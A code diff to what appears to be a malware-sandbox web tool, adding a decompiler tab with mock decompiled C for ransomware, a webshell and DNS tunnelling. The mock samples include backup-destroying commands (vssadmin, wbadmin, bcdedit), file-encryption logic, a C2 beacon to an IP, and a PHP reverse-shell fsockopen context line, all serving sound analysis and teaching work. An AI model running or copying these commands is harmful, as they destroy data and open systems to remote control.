@@ -3027,6 +3027,9 @@ $sock = fsockopen("45.22.19.112", 4444);
     logConsole(`[UPLOAD] Size: ${(metadata.size / 1024).toFixed(2)} KB`, 'info');
     logConsole(`[SYSTEM] ${isIt ? 'Inizializzazione motore di analisi statica per il profilo di minaccia precaricato...' : 'Initializing static analysis engine for preloaded threat profile...'}`, 'info');
     
+    // Trigger Ghidra Decompilation in the background
+    triggerGhidraDecompilation(null, val);
+    
     runSandboxSimulation(metadata, u8);
     
     // Reset select index so it can be re-triggered
@@ -3194,6 +3197,7 @@ async function handleFileSelect(input) {
             };
 
             // Start Simulation with Real Data
+            triggerGhidraDecompilation(file, null);
             runSandboxSimulation(metadata, u8);
 
         } catch (e) {
@@ -4060,6 +4064,434 @@ function generateIntelCheckHTML(isMalicious, meta) {
     return vtHTML + haHTML;
 }
 
+// ---- Ghidra Decompiler UI & Log Helpers ----
+
+function getLocalMockDecompile(sampleType, filename) {
+    const mocks = {
+        ransomware: [
+            {
+                name: "main",
+                entry_point: "0x00401000",
+                code: `int main(int argc, char **argv) {
+    // BlackStorm Ransomware Main Entry
+    if (check_admin_privileges() == 0) {
+        printf("[!] Error: Administrator privileges required.\\n");
+        exit(1);
+    }
+    
+    establish_persistence();
+    delete_shadow_copies();
+    
+    char *target_dir = "C:\\\\Users";
+    encrypt_directory(target_dir);
+    
+    contact_c2_server("http://185.220.101.5/beacon");
+    drop_ransom_note();
+    return 0;
+}`
+            },
+            {
+                name: "delete_shadow_copies",
+                entry_point: "0x00401240",
+                code: `void delete_shadow_copies() {
+    // Evasion: Disable backups and system recovery
+    char *cmd = "vssadmin.exe delete shadows /all /quiet";
+    char *cmd2 = "wbadmin delete catalog -quiet";
+    char *cmd3 = "bcdedit /set {default} recoveryenabled No";
+    
+    ShellExecuteA(NULL, "open", "cmd.exe", "/c vssadmin.exe delete shadows /all /quiet", NULL, 0);
+    ShellExecuteA(NULL, "open", "cmd.exe", "/c wbadmin delete catalog -quiet", NULL, 0);
+    ShellExecuteA(NULL, "open", "cmd.exe", "/c bcdedit /set {default} recoveryenabled No", NULL, 0);
+    printf("[*] VSS backups and recovery policies disabled.\\n");
+}`
+            },
+            {
+                name: "encrypt_directory",
+                entry_point: "0x00401490",
+                code: `void encrypt_directory(char *dir_path) {
+    // Recursive file traversal logic
+    HANDLE hFind;
+    WIN32_FIND_DATA findData;
+    char search_path[260];
+    
+    sprintf(search_path, "%s\\\\*", dir_path);
+    hFind = FindFirstFile(search_path, &findData);
+    
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+                char full_path[260];
+                sprintf(full_path, "%s\\\\%s", dir_path, findData.cFileName);
+                
+                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    encrypt_directory(full_path); // Recurse subdirectory
+                } else {
+                    if (is_target_extension(findData.cFileName)) {
+                        encrypt_file_aes(full_path);
+                    }
+                }
+            }
+        } while (FindNextFile(hFind, &findData));
+        FindClose(hFind);
+    }
+}`
+            },
+            {
+                name: "encrypt_file_aes",
+                entry_point: "0x004017f0",
+                code: `int encrypt_file_aes(char *file_path) {
+    // AES-256 Key schedule and lock execution
+    unsigned char key[32] = { 0x4f, 0xa1, 0xbc, 0x99, 0xef, 0x12, 0x5a, 0xd4, 0x77, 0x88, 0x99, 0xaa }; // Symmetric Key
+    unsigned char iv[16] = { 0 };
+    
+    FILE *in = fopen(file_path, "rb");
+    if (!in) return 0;
+    
+    char out_path[300];
+    sprintf(out_path, "%s.locked", file_path);
+    FILE *out = fopen(out_path, "wb");
+    
+    AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, key, iv);
+    
+    unsigned char buffer[4096];
+    size_t bytes_read;
+    while ((bytes_read = fread(buffer, 1, sizeof(buffer), in)) > 0) {
+        AES_CBC_encrypt_buffer(&ctx, buffer, bytes_read);
+        fwrite(buffer, 1, bytes_read, out);
+    }
+    
+    fclose(in);
+    fclose(out);
+    
+    // Wipe original file contents from logical disk
+    DeleteFileA(file_path);
+    return 1;
+}`
+            },
+            {
+                name: "contact_c2_server",
+                entry_point: "0x00401b20",
+                code: `void contact_c2_server(char *c2_url) {
+    // Network Socket C2 Beaconing
+    HINTERNET hSession = InternetOpenA("BlackStormAgent", 1, NULL, NULL, 0);
+    HINTERNET hConnect = InternetConnectA(hSession, "185.220.101.5", 80, NULL, NULL, 3, 0, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/beacon", NULL, NULL, NULL, 0, 0);
+    
+    char post_data[512];
+    sprintf(post_data, "id=BlackStorm_Victim&status=encrypted&key=AES_256_RSA_WRAP");
+    
+    HttpSendRequestA(hRequest, NULL, 0, post_data, strlen(post_data));
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hSession);
+}`
+            }
+        ],
+        webshell: [
+            {
+                name: "main",
+                entry_point: "0x00401010",
+                code: `int main(int argc, char **argv) {
+    // PHP WebShell Handler Simulation
+    char *input_cmd = get_request_parameter("cmd");
+    char *auth_key = get_request_parameter("password");
+    
+    if (auth_key == NULL || strcmp(auth_key, "supersecurepassword") != 0) {
+        render_login_page();
+        return 0;
+    }
+    
+    if (input_cmd != NULL) {
+        execute_system_command(input_cmd);
+    }
+    return 0;
+}`
+            },
+            {
+                name: "execute_system_command",
+                entry_point: "0x004011d0",
+                code: `void execute_system_command(char *command) {
+    // Shell execution backdoor
+    printf("<pre>Executing Command Input: %s\\n", command);
+    
+    FILE *fp = popen(command, "r");
+    if (fp == NULL) {
+        printf("Error: Failed to bind stdout stream.</pre>");
+        return;
+    }
+    
+    char path[1035];
+    while (fgets(path, sizeof(path), fp) != NULL) {
+        printf("%s", path);
+    }
+    
+    pclose(fp);
+    printf("</pre>");
+}`
+            }
+        ],
+        dns_tunneling: [
+            {
+                name: "main",
+                entry_point: "0x00401000",
+                code: `int main(int argc, char **argv) {
+    // dnstt DNS Tunneling Client Initiation
+    char *dns_server = "dns.c2server.org";
+    char *pubkey_hex = "f3e1a0b32c918a...";
+    
+    initialize_crypto_handshake(pubkey_hex);
+    int sockfd = setup_udp_socket("8.8.8.8", 53);
+    
+    printf("[*] Tunneling network traffic over DNS queries to %s\\n", dns_server);
+    tunnel_event_loop(sockfd, dns_server);
+    return 0;
+}`
+            },
+            {
+                name: "tunnel_event_loop",
+                entry_point: "0x00401340",
+                code: `void tunnel_event_loop(int socket, char *dns_domain) {
+    unsigned char payload[256];
+    unsigned char dns_packet[512];
+    
+    while (1) {
+        int bytes_to_send = read_local_stdin_or_shell(payload);
+        if (bytes_to_send > 0) {
+            build_dns_query_txt(dns_packet, payload, bytes_to_send, dns_domain);
+            sendto(socket, dns_packet, sizeof(dns_packet), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
+            
+            // Listen for TXT record response
+            unsigned char response[512];
+            recvfrom(socket, response, sizeof(response), 0, NULL, NULL);
+            process_dns_response_txt(response);
+        }
+        Sleep(100);
+    }
+}`
+            },
+            {
+                name: "build_dns_query_txt",
+                entry_point: "0x004016a0",
+                code: `void build_dns_query_txt(unsigned char *packet, unsigned char *payload, int len, char *domain) {
+    // Encodes payload as Base32/Base64 and embeds it into DNS labels
+    char base32_payload[128];
+    base32_encode(payload, len, base32_payload);
+    
+    // Format DNS Header
+    sprintf(packet, "\\x00\\x00\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"); // DNS TXT
+    append_dns_name(packet, base32_payload);
+    append_dns_name(packet, domain);
+    
+    append_short(packet, 16); // Type TXT (16)
+    append_short(packet, 1);  // Class IN
+}`
+            }
+        ],
+        clean: [
+            {
+                name: "main",
+                entry_point: "0x00401020",
+                code: `int main(int argc, char **argv) {
+    // Clean utility: Gather local OS details
+    OSVERSIONINFOEXW osvi;
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
+    
+    GetVersionExW((OSVERSIONINFO*)&osvi);
+    printf("Windows Version Details: %d.%d (Build %d)\\n", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
+    
+    print_system_report();
+    return 0;
+}`
+            },
+            {
+                name: "print_system_report",
+                entry_point: "0x004011c0",
+                code: `void print_system_report() {
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    
+    printf("Logical Processors: %d\\n", si.dwNumberOfProcessors);
+    printf("Processor Architecture: %d\\n", si.wProcessorArchitecture);
+    printf("Virtual Memory Allocation Unit: %d bytes\\n", si.dwPageSize);
+}`
+            }
+        ]
+    };
+    
+    if (sampleType && mocks[sampleType]) {
+        return mocks[sampleType];
+    }
+    
+    // Generic fallback
+    const name = filename || "suspicious_binary.exe";
+    return [
+        {
+            name: "entry",
+            entry_point: "0x00401000",
+            code: `void entry(void) {
+    // Main executable entry wrapper for: ${name}
+    __security_init_cookie();
+    int return_code = main(0, NULL);
+    exit(return_code);
+}`
+        },
+        {
+            name: "main",
+            entry_point: "0x00401120",
+            code: `int main(int argc, char **argv) {
+    // Initializing runtime heuristics for: ${name}
+    printf("[*] Starting startup diagnostic checks...\\n");
+    int status = perform_startup_checks();
+    if (status == 0) {
+        printf("Analysis checks completed successfully.\\n");
+    } else {
+        printf("Startup check failure (Error code: %d).\\n", status);
+    }
+    return 0;
+}`
+        },
+        {
+            name: "perform_startup_checks",
+            entry_point: "0x00401250",
+            code: `int perform_startup_checks() {
+    // Basic verification of loaded modules
+    void *module = GetModuleHandleA(NULL);
+    if (module == NULL) {
+        return -1;
+    }
+    
+    // Attempt standard virtual page allocation
+    void *ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (ptr == NULL) {
+        return -2;
+    }
+    
+    VirtualFree(ptr, 0, MEM_RELEASE);
+    return 0;
+}`
+        }
+    ];
+}
+
+function syntaxHighlightC(code) {
+    if (!code) return '';
+    let escaped = code.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    escaped = escaped.replace(/(\/\/.*?$)/gm, '<span class="code-comment">$1</span>');
+    escaped = escaped.replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="code-comment">$1</span>');
+    escaped = escaped.replace(/(".*?")/g, '<span class="code-string">$1</span>');
+    escaped = escaped.replace(/\b(0x[0-9a-fA-F]+|\d+)\b/g, '<span class="code-number">$1</span>');
+    
+    const keywords = [
+        'int', 'void', 'char', 'float', 'double', 'unsigned', 'signed', 'struct', 'union', 'enum',
+        'if', 'else', 'for', 'while', 'do', 'return', 'break', 'continue', 'switch', 'case', 'default',
+        'sizeof', 'typedef', 'volatile', 'const', 'static', 'extern', 'NULL'
+    ];
+    keywords.forEach(kw => {
+        escaped = escaped.replace(new RegExp(`\\b(${kw})\\b(?!([^<]*>))`, 'g'), '<span class="code-keyword">$1</span>');
+    });
+    
+    escaped = escaped.replace(/\b([A-Z][a-zA-Z0-9_]+)(?=\s*\()/g, '<span class="code-api">$1</span>');
+    return escaped;
+}
+
+async function triggerGhidraDecompilation(file, sampleType) {
+    const isIt = currentLang === 'it';
+    logConsole(`[SYSTEM] ${isIt ? 'Avvio decompilatore statico Ghidra...' : 'Launching static decompiler Ghidra...'}`, 'info');
+    
+    // Default fallback mock data
+    window.currentDecompiledData = getLocalMockDecompile(sampleType, file ? file.name : null);
+    
+    try {
+        const formData = new FormData();
+        if (file) {
+            formData.append('file', file);
+        }
+        if (sampleType) {
+            formData.append('sampleType', sampleType);
+        }
+        
+        const response = await fetch('http://localhost:3000/api/sandbox/decompile', {
+            method: 'POST',
+            body: formData
+        });
+        
+        if (response.ok) {
+            const result = await response.json();
+            if (result.success && result.data) {
+                window.currentDecompiledData = result.data;
+                const modeText = result.isMock ? ' (Mock Fallback)' : ' (Ghidra Headless Engine)';
+                logConsole(`[SYSTEM] ${isIt ? 'Decompilazione terminata' : 'Decompilation completed'}${modeText}`, 'success');
+            }
+        }
+    } catch (e) {
+        console.warn('Decompiler API offline, keeping offline mock data.', e);
+        logConsole(`[SYSTEM] ${isIt ? 'Decompilatore offline. Usato motore di decompilazione locale di riserva.' : 'Decompiler offline. Using local backup decompiler engine.'}`, 'warn');
+    }
+}
+
+window.selectDecompiledFunction = function(idx, el) {
+    const items = document.querySelectorAll('.sandbox-decompiler-fn-item');
+    items.forEach(item => item.classList.remove('active'));
+    
+    if (el) el.classList.add('active');
+    
+    const decompiledList = window.currentDecompiledData || [];
+    const fn = decompiledList[idx];
+    const codeContainer = document.getElementById('decompiler-code-container');
+    if (codeContainer && fn) {
+        codeContainer.innerHTML = syntaxHighlightC(fn.code);
+    }
+};
+
+function generateDecompilerHTML() {
+    const isIt = currentLang === 'it';
+    const decompiledList = window.currentDecompiledData || [];
+    
+    if (decompiledList.length === 0) {
+        return `
+            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; color: var(--text-muted); padding: 40px 20px;">
+                <div style="font-size: 2.5rem; margin-bottom: 10px;">⏳</div>
+                <h4 style="font-family: var(--font-mono); color: var(--text-main); font-size: 0.9rem;">
+                    ${isIt ? 'NESSUNA FUNZIONE DECOMPILATA' : 'NO DECOMPILED FUNCTIONS'}
+                </h4>
+                <p style="font-size: 0.78rem; max-width: 320px; margin-top: 5px;">
+                    ${isIt ? 'Lancia la sottomissione al backend per avviare l\'analizzatore Ghidra e caricare le funzioni.' : 'Trigger the sandbox submission to run the Ghidra analyzer and populate program functions.'}
+                </p>
+            </div>
+        `;
+    }
+
+    let sidebarList = '';
+    decompiledList.forEach((fn, idx) => {
+        const activeClass = idx === 0 ? 'active' : '';
+        sidebarList += `
+            <div class="sandbox-decompiler-fn-item ${activeClass}" data-index="${idx}" onclick="window.selectDecompiledFunction(${idx}, this)">
+                <span>${fn.name}</span>
+                <span style="font-size: 0.58rem; color: var(--text-muted); font-family: var(--font-mono);">${fn.entry_point || ''}</span>
+            </div>
+        `;
+    });
+
+    const initialCode = decompiledList[0] ? decompiledList[0].code : '';
+    const highlightedCode = syntaxHighlightC(initialCode);
+
+    return `
+        <div class="sandbox-decompiler-container">
+            <div class="sandbox-decompiler-sidebar">
+                <div class="sandbox-decompiler-sidebar-header">
+                    🔍 ${isIt ? 'FUNZIONI RILEVATE' : 'IDENTIFIED FUNCTIONS'} (${decompiledList.length})
+                </div>
+                <div class="sandbox-decompiler-fn-list" id="decompiler-fn-list-container">
+                    ${sidebarList}
+                </div>
+            </div>
+            <div class="sandbox-decompiler-codeview" id="decompiler-code-container">${highlightedCode}</div>
+        </div>
+    `;
+}
+
 function renderReport(isMalicious, meta) {
     window.currentSandboxReport = { isMalicious, meta };
     const container = document.getElementById('sandbox-report');
@@ -4109,6 +4541,7 @@ function renderReport(isMalicious, meta) {
             <button class="sandbox-tab-btn active" onclick="window.switchSandboxTab('tab-verdict', this)">🛡️ ${isIt ? 'VERDETTO & INTEL' : 'VERDICT & INTEL'}</button>
             <button class="sandbox-tab-btn" onclick="window.switchSandboxTab('tab-structure', this)">🌿 ${isIt ? 'ANALISI STRUTTURALE' : 'STRUCTURAL ANALYSIS'}</button>
             <button class="sandbox-tab-btn" onclick="window.switchSandboxTab('tab-strings', this)">🔍 ${isIt ? 'STRINGHE & IOC' : 'STRINGS & IOCs'}</button>
+            <button class="sandbox-tab-btn" onclick="window.switchSandboxTab('tab-decompiler', this)">⚡ ${isIt ? 'DECOMPILATORE' : 'DECOMPILER'}</button>
             <button class="sandbox-tab-btn" onclick="window.switchSandboxTab('tab-hex', this)">📄 ${isIt ? 'HEX INSPECTOR' : 'HEX INSPECTOR'}</button>
         </div>
         
@@ -4145,7 +4578,12 @@ function renderReport(isMalicious, meta) {
             ${generateExtractedStringsHTML(meta.extractedStrings)}
         </div>
         
-        <!-- Tab 4: Hex Inspector -->
+        <!-- Tab 4: Decompiler -->
+        <div class="sandbox-tab-content" id="tab-decompiler">
+            ${generateDecompilerHTML()}
+        </div>
+        
+        <!-- Tab 5: Hex Inspector -->
         <div class="sandbox-tab-content" id="tab-hex">
             ${generateHexDumpHTML(meta, meta.u8Bytes)}
         </div>
